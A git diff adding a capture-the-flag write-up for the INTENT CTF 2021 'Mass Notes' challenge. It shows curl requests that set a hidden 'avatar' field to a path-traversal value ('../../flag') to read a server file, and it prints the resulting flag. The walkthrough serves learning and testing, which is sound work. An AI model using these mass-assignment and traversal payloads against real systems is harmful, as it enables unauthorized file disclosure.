@@ -453,6 +453,86 @@ And suddenly:
 
 P.S.: for some reason, I couldn't just save the flag locally in the PHP app (missing privileges). It was just faster to make another request.
 
+# Mass Notes
+
+![mass-notes](img/mass-notes.png)
+
+## Challenge
+
+In this challenge, we get a basic notepad app.
+
+![mass-notes-page](img/mass-notes-page.png)
+
+The note is sent encoded in JSON via POST to /note:
+
+```json
+{"title":"Note 1","content":"Text 1"}
+```
+
+And we receive this JSON object as answer:
+
+```json
+{"title":"Note 1","content":"Text 1","avatar":"default_1.png","_id":"6194223d989bedd8dfa702dd","__v":0}
+```
+
+And after that, you are redirected to a ```note.html``` page, that receives this exact JSON in the querystring and build the note page.
+
+![mass-notes-filled](img/mass-notes-filled.png)
+
+## Hacking
+
+After looking in some wrong directions, the avatar is something to take a look.
+
+* You receive ```"avatar":"default_1.png"```, but there is no option in the page to set the avatar.
+* The link of the avatar is: ```https://mass-notes.chal.intentsummit.org/avatar/619420f1989bedd8dfa702da.png```.
+    * The format is: /avatar/ID_RECEIVED.png
+
+
+But What if we can set the avatar and it is only not in the page?
+
+Let's try it:
+
+```
+curl -k 'https://mass-notes.chal.intentsummit.org/note' \
+>   -H 'content-type: application/json' \
+>   --data-raw '{"title":"Note 1","content":"Text 1","avatar":"neptunian.png"}'
+
+{"title":"Note 1","content":"Text 1","avatar":"neptunian.png","_id":"619425b3989bedd8dfa702e2","__v":0}
+```
+
+It worked!
+
+But let's check what happens when we try to get the avatar image with the new ID received (```619425b3989bedd8dfa702e2```):
+
+```
+$ curl -k https://mass-notes.chal.intentsummit.org/avatar/619425b3989bedd8dfa702e2.png
+Error: ENOENT: no such file or directory, open '/app/avatars/neptunian.png'
+```
+
+Yeah! The errors tells us that it is trying to open a file called neptunian.png and didn't found it. We have an LFI!
+
+Let's create another note, pointing our file to the possible flag location. We also know the default path is /app/avatars, so we need to get up two levels in our path traversal.
+
+```
+$ curl -k 'https://mass-notes.chal.intentsummit.org/note' \
+>   -H 'content-type: application/json' \
+>   --data-raw '{"title":"Flag Note","content":"Bleh","avatar":"../../flag"}'
+{"title":"Flag Note","content":"Bleh","avatar":"../../flag","_id":"61942783989bedd8dfa702e4","__v":0}
+```
+
+Get the bastard, using the new ID:
+
+```
+$ curl -k https://mass-notes.chal.intentsummit.org/avatar/61942783989bedd8dfa702e4.png
+INTENT{d0nt_mass_with_ap1s}
+```
+
+```INTENT{d0nt_mass_with_ap1s}```
+
+Next!
+
+# 
+
 # References
 
 * INTENT CTF 2021: https://ctf.intentsummit.org/
